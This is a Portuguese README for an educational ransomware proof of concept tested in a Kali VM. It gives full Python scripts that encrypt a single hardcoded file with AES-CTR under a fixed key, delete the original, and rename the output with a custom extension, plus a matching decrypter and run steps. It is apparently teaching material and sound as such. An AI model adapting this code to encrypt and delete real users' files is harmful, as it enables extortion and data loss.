# 🛡️ Ransomware Python: Criptografia de Dados (PoC)

Este projeto é uma **Prova de Conceito (PoC)** desenvolvida para fins educacionais e de pesquisa em segurança cibernética. O objetivo é demonstrar o funcionamento fundamental de um ransomware, realizando a criptografia e a posterior recuperação de um arquivo utilizando a biblioteca `pyaes` e o algoritmo AES (Advanced Encryption Standard).

## 🚀 Tecnologias Utilizadas

*   **Linguagem:** Python 3
*   **Biblioteca:** `pyaes` (implementação de criptografia AES)
*   **Ambiente de Teste:** Kali Linux (Oracle VM VirtualBox)

---

## 🛠️ Estrutura do Projeto

O projeto é composto por dois scripts principais que operam de forma complementar:

1.  **`encrypter.py`**: Localiza o arquivo alvo, criptografa seu conteúdo utilizando uma chave de 16 bytes e o renomeia com uma extensão personalizada, removendo o arquivo original de forma segura.

2.  **`decrypter.py`**: Localiza o arquivo criptografado, aplica a chave de segurança correspondente para reverter o processo e restaura o arquivo original à sua forma legível.

---

## 📂 Códigos Fonte

### 1. Script de Criptografia (`encrypter.py`)

```python
import os
import pyaes

## Abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remover o arquivo original
os.remove(file_name)

## Chave de criptografia (16 bytes)
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado com nova extensão
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
```

### 2. Script de Descriptografia (decrypter.py)

```python
import os
import pyaes

## Abrir o arquivo criptografado 
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Chave para descriptografia (deve ser a mesma utilizada no encrypter)
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## Remover o arquivo criptografado
os.remove(file_name)

## Criar o arquivo descriptografado original
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
```

## 🔧 Como Executar

### Pré-requisitos

Certifique-se de ter o Python 3 instalado. Em sistemas como o Kali Linux, instale a biblioteca necessária com o seguinte comando:

```
pip install pyaes --break-system-packages
```

### Passo a Passo para o Teste:

1. **Criar o alvo:** Gere um arquivo de texto para o teste:

```
echo "Este arquivo esta legivel" > teste.txt
```

2.  **Criptografar:** Execute o script de sequestro:

```
python3 encrypter.py
```

3. **Validar:** Verifique que o arquivo original foi substituído por:

```
teste.txt.ransomwaretroll
```

4. **Restaurar:** Execute o decifrador para recuperar os dados:

```
python3 decrypter.py
```

---

## ⚖️ Aviso Legal

Este software foi criado exclusivamente para fins didáticos e laboratoriais. O uso de tais ferramentas contra sistemas de terceiros sem autorização prévia é ilegal e passível de punições criminais. 